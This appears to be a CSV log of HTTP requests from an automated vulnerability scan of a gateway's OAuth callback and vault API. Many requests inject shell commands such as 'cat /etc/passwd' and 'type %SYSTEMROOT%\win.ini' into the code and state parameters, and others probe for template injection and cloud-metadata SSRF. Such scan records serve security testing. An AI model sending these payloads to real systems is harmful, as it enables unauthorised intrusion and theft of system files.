ID,Req. Timestamp,Resp. Timestamp,Method,URL,Code,Reason,RTT,Size Resp. Header,Size Resp. Body
5386,Sat May 23 22:18:22 WIB 2026,Sat May 23 22:18:22 WIB 2026,PUT,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets/ae7509ce-bdf0-480b-a25e-57971e9dacb7,200,OK,222,1236,41
5387,Sat May 23 22:18:22 WIB 2026,Sat May 23 22:18:22 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets,200,OK,203,1236,73
5388,Sat May 23 22:18:22 WIB 2026,Sat May 23 22:18:22 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=hVecsG6tE7BHK-23UPYl_Z4L-3akzl1znn1Xj4tKp9j3G%27%26cat+%2Fetc%2Fpasswd%26%27&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D,200,OK,225,1143,464
5389,Sat May 23 22:18:22 WIB 2026,Sat May 23 22:18:22 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/files,403,Forbidden,210,1324,30
5390,Sat May 23 22:18:22 WIB 2026,Sat May 23 22:18:22 WIB 2026,PUT,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets/ae7509ce-bdf0-480b-a25e-57971e9dacb7,200,OK,21,1236,41
5391,Sat May 23 22:18:22 WIB 2026,Sat May 23 22:18:22 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets,200,OK,26,1236,73
5392,Sat May 23 22:18:22 WIB 2026,Sat May 23 22:18:22 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=hVecsG6tE7BHK-23UPYl_Z4L-3akzl1znn1Xj4tKp9j3G%27%3Bcat+%2Fetc%2Fpasswd%3B%27&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D,200,OK,26,1143,464
5393,Sat May 23 22:18:22 WIB 2026,Sat May 23 22:18:22 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/files,403,Forbidden,26,1324,30
5394,Sat May 23 22:18:22 WIB 2026,Sat May 23 22:18:22 WIB 2026,PUT,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets/ae7509ce-bdf0-480b-a25e-57971e9dacb7,200,OK,20,1236,41
5395,Sat May 23 22:18:22 WIB 2026,Sat May 23 22:18:22 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets,200,OK,216,1236,73
5396,Sat May 23 22:18:22 WIB 2026,Sat May 23 22:18:22 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/files,403,Forbidden,220,1324,30
5397,Sat May 23 22:18:22 WIB 2026,Sat May 23 22:18:22 WIB 2026,PUT,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets/ae7509ce-bdf0-480b-a25e-57971e9dacb7,200,OK,208,1236,41
5398,Sat May 23 22:18:22 WIB 2026,Sat May 23 22:18:22 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=type+%25SYSTEMROOT%25%5Cwin.ini&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D,200,OK,223,1143,464
5399,Sat May 23 22:18:22 WIB 2026,Sat May 23 22:18:22 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets,200,OK,29,1236,73
5400,Sat May 23 22:18:22 WIB 2026,Sat May 23 22:18:22 WIB 2026,PUT,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets/ae7509ce-bdf0-480b-a25e-57971e9dacb7,200,OK,19,1236,41
5401,Sat May 23 22:18:22 WIB 2026,Sat May 23 22:18:22 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/files,403,Forbidden,25,1324,30
5402,Sat May 23 22:18:22 WIB 2026,Sat May 23 22:18:22 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=hVecsG6tE7BHK-23UPYl_Z4L-3akzl1znn1Xj4tKp9j3G%26type+%25SYSTEMROOT%25%5Cwin.ini&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D,200,OK,23,1143,464
5403,Sat May 23 22:18:22 WIB 2026,Sat May 23 22:18:22 WIB 2026,PUT,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets/ae7509ce-bdf0-480b-a25e-57971e9dacb7,200,OK,20,1236,41
5404,Sat May 23 22:18:22 WIB 2026,Sat May 23 22:18:22 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets,200,OK,22,1236,73
5405,Sat May 23 22:18:22 WIB 2026,Sat May 23 22:18:23 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets,200,OK,206,1236,73
5406,Sat May 23 22:18:22 WIB 2026,Sat May 23 22:18:23 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/files,403,Forbidden,223,1324,30
5407,Sat May 23 22:18:22 WIB 2026,Sat May 23 22:18:23 WIB 2026,PUT,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets/ae7509ce-bdf0-480b-a25e-57971e9dacb7,200,OK,207,1236,41
5408,Sat May 23 22:18:22 WIB 2026,Sat May 23 22:18:23 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=hVecsG6tE7BHK-23UPYl_Z4L-3akzl1znn1Xj4tKp9j3G%7Ctype+%25SYSTEMROOT%25%5Cwin.ini&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D,200,OK,224,1143,464
5409,Sat May 23 22:18:23 WIB 2026,Sat May 23 22:18:23 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets,200,OK,25,1236,73
5410,Sat May 23 22:18:23 WIB 2026,Sat May 23 22:18:23 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/files,403,Forbidden,25,1324,30
5411,Sat May 23 22:18:23 WIB 2026,Sat May 23 22:18:23 WIB 2026,PUT,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets/ae7509ce-bdf0-480b-a25e-57971e9dacb7,200,OK,27,1236,41
5412,Sat May 23 22:18:23 WIB 2026,Sat May 23 22:18:23 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=hVecsG6tE7BHK-23UPYl_Z4L-3akzl1znn1Xj4tKp9j3G%22%26type+%25SYSTEMROOT%25%5Cwin.ini%26%22&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D,200,OK,26,1143,464
5413,Sat May 23 22:18:23 WIB 2026,Sat May 23 22:18:23 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/files,403,Forbidden,23,1324,30
5414,Sat May 23 22:18:23 WIB 2026,Sat May 23 22:18:23 WIB 2026,PUT,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets/ae7509ce-bdf0-480b-a25e-57971e9dacb7,200,OK,224,1236,41
5415,Sat May 23 22:18:23 WIB 2026,Sat May 23 22:18:23 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/files,403,Forbidden,202,1324,30
5416,Sat May 23 22:18:23 WIB 2026,Sat May 23 22:18:23 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=hVecsG6tE7BHK-23UPYl_Z4L-3akzl1znn1Xj4tKp9j3G%22%7Ctype+%25SYSTEMROOT%25%5Cwin.ini&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D,200,OK,224,1143,464
5417,Sat May 23 22:18:23 WIB 2026,Sat May 23 22:18:23 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets,200,OK,227,1236,73
5418,Sat May 23 22:18:23 WIB 2026,Sat May 23 22:18:23 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/files,403,Forbidden,25,1324,30
5419,Sat May 23 22:18:23 WIB 2026,Sat May 23 22:18:23 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets,200,OK,25,1236,73
5420,Sat May 23 22:18:23 WIB 2026,Sat May 23 22:18:23 WIB 2026,PUT,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets/ae7509ce-bdf0-480b-a25e-57971e9dacb7,200,OK,25,1236,41
5421,Sat May 23 22:18:23 WIB 2026,Sat May 23 22:18:23 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=hVecsG6tE7BHK-23UPYl_Z4L-3akzl1znn1Xj4tKp9j3G%27%26type+%25SYSTEMROOT%25%5Cwin.ini%26%27&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D,200,OK,35,1143,464
5422,Sat May 23 22:18:23 WIB 2026,Sat May 23 22:18:23 WIB 2026,PUT,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets/ae7509ce-bdf0-480b-a25e-57971e9dacb7,200,OK,233,1236,41
5423,Sat May 23 22:18:23 WIB 2026,Sat May 23 22:18:23 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets,200,OK,235,1236,73
5424,Sat May 23 22:18:23 WIB 2026,Sat May 23 22:18:23 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/files,403,Forbidden,235,1324,30
5425,Sat May 23 22:18:23 WIB 2026,Sat May 23 22:18:23 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=hVecsG6tE7BHK-23UPYl_Z4L-3akzl1znn1Xj4tKp9j3G%27%7Ctype+%25SYSTEMROOT%25%5Cwin.ini&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D,200,OK,227,1143,464
5426,Sat May 23 22:18:23 WIB 2026,Sat May 23 22:18:23 WIB 2026,PUT,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets/ae7509ce-bdf0-480b-a25e-57971e9dacb7,200,OK,225,1236,41
5427,Sat May 23 22:18:23 WIB 2026,Sat May 23 22:18:23 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets,200,OK,227,1236,73
5428,Sat May 23 22:18:23 WIB 2026,Sat May 23 22:18:23 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=get-help&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D,200,OK,230,1143,464
5429,Sat May 23 22:18:23 WIB 2026,Sat May 23 22:18:23 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/files,403,Forbidden,232,1324,30
5430,Sat May 23 22:18:23 WIB 2026,Sat May 23 22:18:23 WIB 2026,PUT,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets/ae7509ce-bdf0-480b-a25e-57971e9dacb7,200,OK,19,1236,41
5431,Sat May 23 22:18:23 WIB 2026,Sat May 23 22:18:23 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets,200,OK,21,1236,73
5432,Sat May 23 22:18:23 WIB 2026,Sat May 23 22:18:23 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/files,403,Forbidden,21,1324,30
5433,Sat May 23 22:18:23 WIB 2026,Sat May 23 22:18:23 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=hVecsG6tE7BHK-23UPYl_Z4L-3akzl1znn1Xj4tKp9j3G%3Bget-help&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D,200,OK,22,1143,464
5434,Sat May 23 22:18:23 WIB 2026,Sat May 23 22:18:23 WIB 2026,PUT,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets/ae7509ce-bdf0-480b-a25e-57971e9dacb7,200,OK,21,1236,41
5435,Sat May 23 22:18:23 WIB 2026,Sat May 23 22:18:23 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets,200,OK,20,1236,73
5436,Sat May 23 22:18:23 WIB 2026,Sat May 23 22:18:24 WIB 2026,PUT,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets/ae7509ce-bdf0-480b-a25e-57971e9dacb7,200,OK,215,1236,41
5437,Sat May 23 22:18:23 WIB 2026,Sat May 23 22:18:24 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/files,403,Forbidden,224,1324,30
5438,Sat May 23 22:18:23 WIB 2026,Sat May 23 22:18:24 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets,200,OK,214,1236,73
5439,Sat May 23 22:18:23 WIB 2026,Sat May 23 22:18:24 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=hVecsG6tE7BHK-23UPYl_Z4L-3akzl1znn1Xj4tKp9j3G%22%3Bget-help&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D,200,OK,228,1143,464
5440,Sat May 23 22:18:29 WIB 2026,Sat May 23 22:18:30 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=hVecsG6tE7BHK-23UPYl_Z4L-3akzl1znn1Xj4tKp9j3G&state=cat+%2Fetc%2Fpasswd,200,OK,1243,1143,464
5441,Sat May 23 22:18:30 WIB 2026,Sat May 23 22:18:30 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=hVecsG6tE7BHK-23UPYl_Z4L-3akzl1znn1Xj4tKp9j3G&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D%26cat+%2Fetc%2Fpasswd%26,200,OK,228,1143,464
5442,Sat May 23 22:18:30 WIB 2026,Sat May 23 22:18:30 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=hVecsG6tE7BHK-23UPYl_Z4L-3akzl1znn1Xj4tKp9j3G&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D%3Bcat+%2Fetc%2Fpasswd%3B,200,OK,18,1143,464
5443,Sat May 23 22:18:29 WIB 2026,Sat May 23 22:18:31 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets,200,OK,1721,1236,73
5445,Sat May 23 22:18:36 WIB 2026,Sat May 23 22:18:37 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=hVecsG6tE7BHK-23UPYl_Z4L-3akzl1znn1Xj4tKp9j3G&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D%27%26cat+%2Fetc%2Fpasswd%26%27,200,OK,1333,1143,464
5446,Sat May 23 22:18:37 WIB 2026,Sat May 23 22:18:38 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=hVecsG6tE7BHK-23UPYl_Z4L-3akzl1znn1Xj4tKp9j3G&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D%27%3Bcat+%2Fetc%2Fpasswd%3B%27,200,OK,172,1143,464
5447,Sat May 23 22:18:38 WIB 2026,Sat May 23 22:18:38 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=hVecsG6tE7BHK-23UPYl_Z4L-3akzl1znn1Xj4tKp9j3G&state=type+%25SYSTEMROOT%25%5Cwin.ini,200,OK,20,1143,464
5448,Sat May 23 22:18:38 WIB 2026,Sat May 23 22:18:38 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=hVecsG6tE7BHK-23UPYl_Z4L-3akzl1znn1Xj4tKp9j3G&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D%26type+%25SYSTEMROOT%25%5Cwin.ini,200,OK,20,1143,464
5449,Sat May 23 22:18:38 WIB 2026,Sat May 23 22:18:38 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=hVecsG6tE7BHK-23UPYl_Z4L-3akzl1znn1Xj4tKp9j3G&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D%7Ctype+%25SYSTEMROOT%25%5Cwin.ini,200,OK,21,1143,464
5450,Sat May 23 22:18:38 WIB 2026,Sat May 23 22:18:38 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=hVecsG6tE7BHK-23UPYl_Z4L-3akzl1znn1Xj4tKp9j3G&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D%22%26type+%25SYSTEMROOT%25%5Cwin.ini%26%22,200,OK,20,1143,464
5451,Sat May 23 22:18:38 WIB 2026,Sat May 23 22:18:38 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=hVecsG6tE7BHK-23UPYl_Z4L-3akzl1znn1Xj4tKp9j3G&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D%22%7Ctype+%25SYSTEMROOT%25%5Cwin.ini,200,OK,169,1143,464
5452,Sat May 23 22:18:38 WIB 2026,Sat May 23 22:18:38 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=hVecsG6tE7BHK-23UPYl_Z4L-3akzl1znn1Xj4tKp9j3G&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D%27%26type+%25SYSTEMROOT%25%5Cwin.ini%26%27,200,OK,20,1143,464
5453,Sat May 23 22:18:38 WIB 2026,Sat May 23 22:18:38 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=hVecsG6tE7BHK-23UPYl_Z4L-3akzl1znn1Xj4tKp9j3G&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D%27%7Ctype+%25SYSTEMROOT%25%5Cwin.ini,200,OK,20,1143,464
5454,Sat May 23 22:18:38 WIB 2026,Sat May 23 22:18:38 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=hVecsG6tE7BHK-23UPYl_Z4L-3akzl1znn1Xj4tKp9j3G&state=get-help,200,OK,20,1143,464
5455,Sat May 23 22:18:38 WIB 2026,Sat May 23 22:18:38 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=hVecsG6tE7BHK-23UPYl_Z4L-3akzl1znn1Xj4tKp9j3G&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D%3Bget-help,200,OK,20,1143,464
5456,Sat May 23 22:18:38 WIB 2026,Sat May 23 22:18:38 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=hVecsG6tE7BHK-23UPYl_Z4L-3akzl1znn1Xj4tKp9j3G&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D%22%3Bget-help,200,OK,18,1143,464
5457,Sat May 23 22:18:35 WIB 2026,Sat May 23 22:18:38 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets,200,OK,2756,1236,73
5458,Sat May 23 22:18:36 WIB 2026,Sat May 23 22:18:38 WIB 2026,PUT,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets/ae7509ce-bdf0-480b-a25e-57971e9dacb7,200,OK,2008,1236,41
5459,Sat May 23 22:18:43 WIB 2026,Sat May 23 22:18:45 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets,200,OK,1507,1236,73
5460,Sat May 23 22:18:43 WIB 2026,Sat May 23 22:18:45 WIB 2026,PUT,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets/ae7509ce-bdf0-480b-a25e-57971e9dacb7,200,OK,1509,1236,41
5461,Sat May 23 22:18:53 WIB 2026,Sat May 23 22:18:57 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets,200,OK,3495,1236,73
5463,Sat May 23 22:19:05 WIB 2026,Sat May 23 22:19:07 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets,200,OK,2275,1236,73
5464,Sat May 23 22:19:07 WIB 2026,Sat May 23 22:19:07 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets,200,OK,237,1236,73
5465,Sat May 23 22:19:05 WIB 2026,Sat May 23 22:19:08 WIB 2026,PUT,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets/ae7509ce-bdf0-480b-a25e-57971e9dacb7,200,OK,2774,1236,41
5467,Sat May 23 22:19:40 WIB 2026,Sat May 23 22:19:42 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=hVecsG6tE7BHK-23UPYl_Z4L-3akzl1znn1Xj4tKp9j3G&state=%22%27,200,OK,1494,1143,464
5468,Sat May 23 22:19:47 WIB 2026,Sat May 23 22:19:51 WIB 2026,PUT,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets/ae7509ce-bdf0-480b-a25e-57971e9dacb7,200,OK,3289,1236,41
5469,Sat May 23 22:19:59 WIB 2026,Sat May 23 22:20:01 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/api/v1,403,Forbidden,2230,1069,25
5470,Sat May 23 22:20:01 WIB 2026,Sat May 23 22:20:01 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/api/v1/vault,403,Forbidden,271,1171,25
5471,Sat May 23 22:20:01 WIB 2026,Sat May 23 22:20:02 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/assets,301,Moved Permanently,220,758,156
5473,Sat May 23 22:20:02 WIB 2026,Sat May 23 22:20:02 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080,200,OK,248,1143,464
5474,Sat May 23 22:20:02 WIB 2026,Sat May 23 22:20:02 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/api,403,Forbidden,239,1069,25
5475,Sat May 23 22:20:02 WIB 2026,Sat May 23 22:20:02 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/api/v1,403,Forbidden,24,1069,25
5476,Sat May 23 22:20:02 WIB 2026,Sat May 23 22:20:02 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/api/v1/vault,403,Forbidden,226,1171,25
5477,Sat May 23 22:20:02 WIB 2026,Sat May 23 22:20:03 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/assets,301,Moved Permanently,492,758,156
5478,Sat May 23 22:20:03 WIB 2026,Sat May 23 22:20:03 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=zj+9669*6634+zj&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D,200,OK,19,1143,464
5479,Sat May 23 22:20:03 WIB 2026,Sat May 23 22:20:03 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/latest/meta-data/?code=hVecsG6tE7BHK-23UPYl_Z4L-3akzl1znn1Xj4tKp9j3G&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D,200,OK,245,1143,464
5480,Sat May 23 22:20:03 WIB 2026,Sat May 23 22:20:03 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=zj%7B3911*7939%7Dzj&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D,200,OK,237,1143,464
5481,Sat May 23 22:20:03 WIB 2026,Sat May 23 22:20:03 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/latest/meta-data/?code=hVecsG6tE7BHK-23UPYl_Z4L-3akzl1znn1Xj4tKp9j3G&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D,200,OK,18,1143,464
5482,Sat May 23 22:20:03 WIB 2026,Sat May 23 22:20:03 WIB 2026,PUT,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets/ae7509ce-bdf0-480b-a25e-57971e9dacb7,200,OK,517,1236,41
5483,Sat May 23 22:20:03 WIB 2026,Sat May 23 22:20:04 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/files,403,Forbidden,744,1324,30
5484,Sat May 23 22:20:03 WIB 2026,Sat May 23 22:20:04 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080,200,OK,751,1143,464
5485,Sat May 23 22:20:03 WIB 2026,Sat May 23 22:20:04 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets,200,OK,748,1236,73
5486,Sat May 23 22:20:03 WIB 2026,Sat May 23 22:20:04 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=zj%24%7B5957*6068%7Dzj&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D,200,OK,499,1143,464
5487,Sat May 23 22:20:03 WIB 2026,Sat May 23 22:20:04 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/computeMetadata/v1/?code=hVecsG6tE7BHK-23UPYl_Z4L-3akzl1znn1Xj4tKp9j3G&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D,200,OK,496,1143,464
5488,Sat May 23 22:20:03 WIB 2026,Sat May 23 22:20:04 WIB 2026,PUT,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets/ae7509ce-bdf0-480b-a25e-57971e9dacb7,200,OK,239,1236,41
5489,Sat May 23 22:20:04 WIB 2026,Sat May 23 22:20:04 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/files,403,Forbidden,246,1324,30
5490,Sat May 23 22:20:04 WIB 2026,Sat May 23 22:20:04 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/api,403,Forbidden,260,1069,25
5491,Sat May 23 22:20:04 WIB 2026,Sat May 23 22:20:04 WIB 2026,PUT,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets/ae7509ce-bdf0-480b-a25e-57971e9dacb7,200,OK,257,1236,41
5492,Sat May 23 22:20:04 WIB 2026,Sat May 23 22:20:04 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=zj%23%7B3107*4474%7Dzj&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D,200,OK,265,1143,464
5493,Sat May 23 22:20:04 WIB 2026,Sat May 23 22:20:04 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/files,403,Forbidden,260,1324,30
